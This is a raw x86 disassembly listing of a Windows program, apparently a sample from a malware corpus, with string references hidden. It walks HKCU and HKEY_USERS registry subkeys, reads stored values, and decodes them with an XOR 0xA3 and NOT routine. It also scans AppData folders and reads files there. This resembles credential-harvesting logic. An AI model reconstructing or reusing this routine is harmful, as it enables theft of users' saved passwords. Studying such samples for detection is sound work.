lea eax [ ebp - 0xc1c ]
push eax
lea eax [ ebp + 0x50 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp + 0x54 ]
push [ ebp + 0x58 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
lea eax [ ebp - 0x101c ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x101c ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x3f ]
push eax
lea ecx [ ebp + 0x50 ]
call sub_40f80b
lea ecx [ ebp + 0x3f ]
call sub_40f609
push [ ebp + 0x54 ]
push [ ebp + 0x58 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
lea eax [ ebp - 0x81c ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x81c ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x32 ]
push eax
lea ecx [ ebp + 0x50 ]
call sub_40f80b
lea ecx [ ebp + 0x32 ]
call sub_40f609
push [ ebp + 0x54 ]
push [ ebp + 0x58 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
lea ecx [ ebp + 0x50 ]
call sub_40f609
lea eax [ ebp - 0x81c ]
push eax
call [ lstrlenW@IAT ]
push ebx
push ebx
push ebx
push ebx
push eax
mov [ ebp + 0x4c ] eax
lea eax [ ebp - 0x81c ]
push eax
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
mov [ ebp + 0x70 ] eax
je r-xdata
inc eax
push eax
call sub_411160
pop ecx
push ebx
push ebx
push [ ebp + 0x70 ]
mov edi eax
push edi
push [ ebp + 0x4c ]
lea eax [ ebp - 0x81c ]
push eax
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov [ edi + eax ] bl
inc eax
push eax
lea eax [ ebp - 0x81c ]
push edi
push eax
call sub_4117bc
push edi
call sub_410a7a
add esp 0x10
sub_405a96
push ebp
mov ebp esp
sub esp 0x124
push esi
push 0x15
call sub_411160
mov esi eax
test esi esi
pop ecx
je r-xdata
and [ rw-data ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx esi
call sub_40eb9e
mov [ rw-data ] eax
jmp r-xdata
pop esi
leave
retn
push 0x102
lea eax [ ebp - 0x124 ]
push eax
push r--data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
je r-xdata
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x18 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] sub_40f09c
lea eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
mov ecx [ rw-data ]
test ecx ecx
mov esi ecx
je r-xdata
lea eax [ ebp - 0x124 ]
push eax
call sub_40559c
pop ecx
call sub_40ed8a
push esi
call sub_410a7a
pop ecx
sub_405b76
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_411738
test eax eax
pop ecx
jbe r-xdata
xor al al
push edi
lea eax [ ebp - 0x4 ]
push eax
mov edi r--data
push edi
push [ esi ]
call sub_4115f3
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi ]
inc eax
push edi
push eax
call sub_4115f3
mov al [ ebp - 0x4 ]
add [ esi ] 0x2
shl al 0x4
add al [ ebp - 0x8 ]
add esp 0x18
xor al 0xa3
not al
pop edi
jmp r-xdata
pop esi
leave
retn
sub_405bc6
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
call sub_405b76
cmp al 0xff
pop ecx
jne r-xdata
mov bl al
lea eax [ ebp + 0x8 ]
push eax
call sub_405b76
movzx eax al
pop ecx
mov ecx [ ebp + 0x8 ]
movzx esi bl
lea eax [ ecx + eax * 2 ]
xor edi edi
test esi esi
mov [ ebp + 0x8 ] eax
jle r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_405b76
lea eax [ ebp + 0x8 ]
push eax
call sub_405b76
pop ecx
pop ecx
mov [ ebp + edi - 0x64 ] 0x0
pop edi
pop esi
lea eax [ ebp - 0x64 ]
pop ebx
leave
retn
lea eax [ ebp + 0x8 ]
push eax
call sub_405b76
inc edi
cmp edi esi
pop ecx
jl r-xdata
sub_405c2e
push ebp
mov ebp esp
sub esp 0x4ac
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x54 ]
call sub_40eb9e
call sub_40f095
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] esp
mov [ ebp - 0x28 ] ebp
lea eax [ ebp - 0x1c ]
push eax
call sub_40f06f
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x1c ]
pop ecx
mov [ ebp - 0x60 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] sub_40f09c
lea eax [ ebp - 0x68 ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x20019
xor esi esi
push esi
mov edi 0xff
push r--data
push 0x80000001
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x54 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x8 ]
push eax
push esi
push esi
push esi
push [ ebp - 0x14 ]
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x8 ] esi
je r-xdata
mov eax [ ebp - 0x68 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] esi
jbe r-xdata
lea ebx [ edi + 0x5 ]
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push esi
lea eax [ ebp - 0x4ac ]
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x4ac ]
push eax
push [ ebp - 0x2c ]
mov [ ebp - 0x24 ] edi
push [ ebp - 0x14 ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x2a8 ]
push esi
push eax
call sub_41112d
push ebx
lea eax [ ebp - 0x3ac ]
push esi
push eax
call sub_41112d
push ebx
lea eax [ ebp - 0x1a4 ]
push esi
push eax
call sub_41112d
add esp 0x24
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x2a8 ]
push eax
push esi
push esi
push r--data
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0xc ] edi
call [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x3ac ]
push eax
push esi
push esi
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1a4 ]
push eax
push esi
push esi
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x2a8 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x3ac ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
jne r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_40c364
add esp 0xc
push [ ebp - 0x38 ]
push [ ebp - 0x34 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x54 ]
call sub_40ec7e
sub esp 0x10
mov eax esp
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push eax
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x85 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_40f80b
lea ecx [ ebp - 0x85 ]
call sub_40f609
push [ ebp - 0x38 ]
push [ ebp - 0x34 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x54 ]
call sub_40ec7e
sub esp 0x10
mov eax esp
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x3ac ]
push ecx
push eax
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x9f ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_40f80b
lea ecx [ ebp - 0x9f ]
call sub_40f609
push [ ebp - 0x38 ]
push [ ebp - 0x34 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x54 ]
call sub_40ec7e
push r--data
lea ecx [ ebp - 0x78 ]
call sub_40f45c
sub esp 0x10
mov eax esp
push [ ebp - 0x70 ]
push [ ebp - 0x74 ]
push eax
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x92 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_40f80b
lea ecx [ ebp - 0x92 ]
call sub_40f609
push [ ebp - 0x38 ]
push [ ebp - 0x34 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x54 ]
call sub_40ec7e
lea ecx [ ebp - 0x78 ]
call sub_40f609
lea ecx [ ebp - 0x3c ]
call sub_40f609
lea eax [ ebp - 0x1a4 ]
push ebx
push eax
call sub_405bc6
pop ecx
push eax
lea eax [ ebp - 0x1a4 ]
push eax
call sub_4117bc
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
sub_405fb2
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov edi 0x104
push edi
call sub_411160
push edi
mov [ ebp - 0x8 ] eax
call sub_411160
push edi
mov [ ebp - 0xc ] eax
call sub_411160
push edi
mov [ ebp - 0x10 ] eax
call sub_411160
lea esi [ edi - 0x5 ]
push esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x38 ] esi
call sub_411160
push esi
mov [ ebp - 0x20 ] eax
call sub_411160
add esp 0x18
push 0x3e8
sub esp 0x10
mov ecx esp
xor ebx ebx
push r--data
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] ebx
call sub_40f45c
lea ecx [ ebp - 0x60 ]
call sub_40eb9e
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x18 ]
push eax
push ebx
push ebx
push ebx
push 0x80000003
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_410a7a
push [ ebp - 0xc ]
call sub_410a7a
push [ ebp - 0x10 ]
call sub_410a7a
push [ ebp - 0x1c ]
call sub_410a7a
push [ ebp - 0x20 ]
call sub_410a7a
push [ ebp - 0x24 ]
call sub_410a7a
add esp 0x18
lea ecx [ ebp - 0x60 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x14 ] ebx
jbe r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x24 ]
mov [ ebp - 0x28 ] esi
push [ ebp - 0x14 ]
push 0x80000003
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
call sub_4116d8
push esi
push r--data
push [ ebp - 0x20 ]
call sub_411765
add esp 0x14
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push [ ebp - 0x20 ]
push 0x80000003
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push edi
push ebx
push [ ebp - 0x8 ]
call sub_41112d
push edi
push ebx
push [ ebp - 0xc ]
call sub_41112d
push edi
push ebx
push [ ebp - 0x10 ]
call sub_41112d
add esp 0x24
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x8 ]
push ebx
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push ebx
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0xc ]
push ebx
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x1c ]
push ebx
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x60 ]
call sub_40ec7e
push [ ebp - 0x8 ]
call sub_411738
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x44 ]
push [ ebp - 0x40 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x60 ]
call sub_40ec7e
push [ ebp - 0xc ]
push [ ebp - 0xc ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x60 ]
call sub_40ec7e
push [ ebp - 0x1c ]
push [ ebp - 0x1c ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x60 ]
call sub_40ec7e
lea ecx [ ebp - 0x48 ]
call sub_40f609
sub_406250
push ebx
push esi
mov esi ecx
lea edx [ esi + 0x10c ]
push edi
mov ecx edx
call sub_40623f
xor ebx ebx
push 0x1
mov [ esi + 0x314 ] bl
mov [ esi + 0x210 ] bl
mov [ edx ] bl
mov [ esi ] bl
call sub_411160
pop ecx
mov [ esi + 0x104 ] eax
mov [ eax ] bl
mov eax 0x30c0
push ebx
push eax
lea edi [ esi + 0x420 ]
push 0x4
mov [ esi + 0x41c ] ebx
mov [ edi ] eax
call [ HeapCreate@IAT ]
push [ edi ]
mov [ esi + 0x418 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi + 0x108 ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn
sub_4062e0
push ebx
push esi
mov esi ecx
inc [ esi + 0x41c ]
mov eax [ esi + 0x420 ]
mov ecx [ esi + 0x41c ]
xor ebx ebx
cmp eax ebx
push edi
jne r-xdata
imul ecx ecx 0x30c
cmp ecx eax
jbe r-xdata
xor edi edi
inc edi
push edi
mov [ esi + 0x314 ] bl
mov [ esi + 0x210 ] bl
mov [ esi + 0x10c ] bl
mov [ esi ] bl
call sub_411160
pop ecx
mov [ esi + 0x104 ] eax
mov [ eax ] bl
mov eax 0x30c0
push ebx
push eax
push 0x4
mov [ esi + 0x41c ] edi
mov [ esi + 0x420 ] eax
call [ HeapCreate@IAT ]
push [ esi + 0x420 ]
mov [ esi + 0x418 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi + 0x108 ] eax
jmp r-xdata
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x10 ]
lea eax [ eax + ecx - 0x30c ]
push eax
call sub_4116d8
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x1c ]
lea eax [ eax + ecx - 0x208 ]
push eax
call sub_4116d8
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x28 ]
lea eax [ eax + ecx - 0x104 ]
push eax
call sub_4116d8
add esp 0x18
pop edi
pop esi
pop ebx
retn 0xc
add eax 0x30c0
push eax
lea edi [ esi + 0x108 ]
push [ edi ]
mov [ esi + 0x420 ] eax
push 0x8
push [ esi + 0x418 ]
call [ HeapReAlloc@IAT ]
mov [ edi ] eax
sub_406425
push esi
mov esi ecx
mov eax [ esi + 0x104 ]
test eax eax
push edi
je r-xdata
mov edi [ esp + 0x10 ]
lea eax [ edi + 0x1 ]
push eax
call sub_411160
push edi
push [ esp + 0x14 ]
mov [ esi + 0x104 ] eax
mov [ eax + edi ] 0x0
push [ esi + 0x104 ]
call sub_4110cf
add esp 0x10
pop edi
pop esi
retn 0x8
push eax
call sub_410a7a
pop ecx
sub_406469
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
mov ecx edi
call sub_406250
xor ecx ecx
mov eax 0x4240
push ecx
mov [ edi ] cl
push eax
lea edi [ esi + 0x430 ]
push 0x4
mov [ esi + 0x10c ] ecx
mov [ esi + 0x42c ] ecx
mov [ edi ] eax
call [ HeapCreate@IAT ]
push [ edi ]
mov [ esi + 0x428 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
retn
sub_4064ce
push esi
mov esi ecx
inc [ esi + 0x42c ]
xor ecx ecx
cmp [ esi + 0x430 ] ecx
jne r-xdata
mov ecx [ esi + 0x42c ]
mov eax [ esi + 0x430 ]
imul ecx ecx 0x424
cmp ecx eax
jbe r-xdata
mov eax 0x4240
push ecx
push eax
push 0x4
mov [ esi + 0x4 ] cl
mov [ esi + 0x10c ] ecx
mov [ esi + 0x42c ] 0x1
mov [ esi + 0x430 ] eax
call [ HeapCreate@IAT ]
push [ esi + 0x430 ]
mov [ esi + 0x428 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x42c ]
mov ecx [ esi ]
imul eax eax 0x424
push [ esp + 0x8 ]
lea eax [ eax + ecx - 0x424 ]
push eax
call sub_4116d8
pop ecx
pop ecx
pop esi
retn 0x4
add eax 0x4240
push eax
push [ esi ]
mov [ esi + 0x430 ] eax
push 0x8
push [ esi + 0x428 ]
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
sub_4065a6
push ebp
mov ebp esp
sub esp 0x104
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x104 ] bl
call sub_41112d
push r--data
push [ ebp + 0x8 ]
call sub_411692
add esp 0x14
test eax eax
je r-xdata
xor al al
push r--data
push [ ebp + 0x8 ]
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
add esi 0xc
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_4116d8
mov esi r--data
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_411657
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
add esp 0x18
cmp [ ebp + 0xc ] ebx
je r-xdata
push ebx
push 0x2000000
push 0x3
push ebx
push 0x1
push 0x80000000
lea eax [ ebp - 0x104 ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
setne al
jmp r-xdata
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_411657
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
add esp 0x10
pop esi
pop ebx
leave
retn 0x8
sub_406695
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x10b ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x10c ] bl
call sub_41112d
add esp 0xc
push 0x40
pop edi
push ebx
push edi
push 0x4
mov [ ebp - 0x4 ] edi
mov [ esi ] ebx
call [ HeapCreate@IAT ]
push edi
push 0x8
push eax
mov [ esi + 0x4 ] eax
call [ HeapAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x8 ] eax
jne r-xdata
lea eax [ esi + 0xc ]
push eax
push ebx
push ebx
push 0x1a
push ebx
call [ SHGetFolderPathA@IAT ]
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call [ HeapDestroy@IAT ]
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
mov edi r--data
push edi
lea eax [ esi + 0xc ]
push edi
push eax
call sub_41188f
pop ecx
pop ecx
inc eax
push eax
call sub_41188f
mov [ eax ] bl
lea eax [ esi + 0xc ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call sub_4116d8
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_411657
add esp 0x18
lea eax [ ebp - 0x24c ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
test [ ebp - 0x24c ] 0x10
je r-xdata
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
mov ecx esi
call sub_4065a6
test al al
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
inc [ esi ]
mov eax [ esi ]
shl eax 0x2
cmp eax [ ebp - 0x4 ]
jbe r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
add [ ebp - 0x4 ] 0x40
push [ ebp - 0x4 ]
push [ esi + 0x8 ]
push 0x8
push [ esi + 0x4 ]
call [ HeapReAlloc@IAT ]
mov [ esi + 0x8 ] eax
push [ esi + 0x4 ]
call [ HeapDestroy@IAT ]
mov [ esi ] ebx
jmp r-xdata
mov ecx [ esi ]
cmp [ eax + ecx * 4 - 0x4 ] ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push eax
mov eax [ esi ]
push [ ecx + eax * 4 - 0x4 ]
call sub_4116d8
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
push edi
push [ ecx + eax * 4 - 0x4 ]
call sub_411657
mov ecx [ esi + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
mov eax [ esi ]
push [ ecx + eax * 4 - 0x4 ]
call sub_411657
add esp 0x18
push 0x104
push 0x8
push [ esi + 0x4 ]
call [ HeapAlloc@IAT ]
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov [ edx + ecx * 4 - 0x4 ] eax
sub_40686c
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push esi
call sub_410bf3
push esi
mov edi eax
call sub_411738
add esp 0x10
dec eax
test eax eax
mov ecx eax
jle r-xdata
test ecx ecx
jl r-xdata
mov dl [ ecx + esi ]
cmp dl 0xd
je r-xdata
mov eax edi
pop edi
pop esi
retn
lea edx [ ecx + 0x1 ]
cmp edx eax
jg r-xdata
dec ecx
test ecx ecx
jg r-xdata
cmp dl 0xa
je r-xdata
mov [ ecx + esi + 0x1 ] 0x0
cmp dl 0x9
jne r-xdata
sub_4068be
push ebp
mov ebp esp
sub esp 0x104
push ebx
push esi
push edi
push 0x103
lea eax [ ebp - 0x103 ]
push 0x0
push eax
mov [ ebp - 0x104 ] 0x0
call sub_41112d
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
mov ebx r--data
lea eax [ ebp - 0x104 ]
push ebx
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
mov esi r--data
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_41188f
add esp 0x2c
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_410c4c
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_41188f
pop ecx
pop ecx
mov [ eax ] 0x5c
push 0x2
push 0x0
push edi
call sub_410e24
push edi
call sub_410e80
push 0x0
push 0x0
push edi
mov ebx eax
call sub_410e24
push ebx
call sub_411160
push edi
push ebx
mov esi eax
push 0x1
push esi
call sub_410d0d
push edi
call sub_410b53
add esp 0x34
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x104 ]
push ebx
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_41188f
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_410c4c
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_41188f
pop ecx
pop ecx
mov [ eax ] 0x5c
push 0x1
xor ebx ebx
call sub_411160
mov esi eax
pop ecx
mov [ esi ] bl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
push esi
call sub_406595
mov ecx [ ebp + 0x8 ]
dec eax
push eax
call sub_406579
mov ecx eax
call sub_406425
push esi
call sub_410a7a
pop ecx
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_406a36
push ebp
mov ebp esp
sub esp 0x404
push esi
push 0x3ff
lea eax [ ebp - 0x403 ]
push 0x0
push eax
mov [ ebp - 0x404 ] 0x0
call sub_41112d
push [ ebp + 0xc ]
lea eax [ ebp - 0x404 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_411657
mov esi r--data
lea eax [ ebp - 0x404 ]
push esi
push eax
call sub_41188f
add esp 0x2c
test eax eax
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_410c4c
test eax eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0x404 ]
push esi
push eax
call sub_41188f
pop ecx
pop ecx
mov [ eax ] 0x5c
push eax
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_40686c
add esp 0xc
test eax eax
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
call sub_410b53
pop ecx
mov al 0x1
push edi
mov edi r--data
push ebx
pop esi
leave
retn
push [ ebp - 0x4 ]
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_40686c
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebx + 0x2 ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_41188f
mov ebx eax
test ebx ebx
pop ecx
pop ecx
je r-xdata
jmp r-xdata
cmp [ ebx + 0x3 ] 0x0
je r-xdata
pop ebx
pop edi
push edi
push eax
call sub_41188f
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push r--data
push ebx
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
cmp eax esi
jb r-xdata
push edi
inc esi
push esi
call sub_41188f
mov esi eax
inc esi
push edi
push esi
call sub_41188f
sub eax esi
push eax
push esi
push [ ebp + 0x8 ]
call sub_4117bc
add esp 0x1c
sub_406b94
push ebp
mov ebp esp
sub esp 0xc60
push ebx
push esi
push edi
mov ebx 0x103
push ebx
lea eax [ ebp - 0x42b ]
push 0x0
push eax
mov [ ebp - 0x42c ] 0x0
call sub_41112d
mov esi r--data
lea edi [ ebp - 0x224 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xf7
xor edi edi
lea eax [ ebp - 0x217 ]
push edi
push eax
call sub_41112d
push [ ebp + 0xc ]
lea eax [ ebp - 0xc60 ]
push eax
call sub_4116d8
lea eax [ ebp - 0xc60 ]
push r--data
push eax
call sub_411657
add esp 0x28
lea eax [ ebp - 0x878 ]
push eax
lea eax [ ebp - 0xc60 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push ebx
lea eax [ ebp - 0x11f ]
push edi
push eax
mov [ ebp - 0x120 ] 0x0
call sub_41112d
push ebx
lea eax [ ebp - 0x327 ]
push edi
push eax
mov [ ebp - 0x328 ] 0x0
call sub_41112d
push ebx
lea eax [ ebp - 0x52f ]
push edi
push eax
mov [ ebp - 0x530 ] 0x0
call sub_41112d
push ebx
lea eax [ ebp - 0x633 ]
push edi
push eax
mov [ ebp - 0x634 ] 0x0
call sub_41112d
push ebx
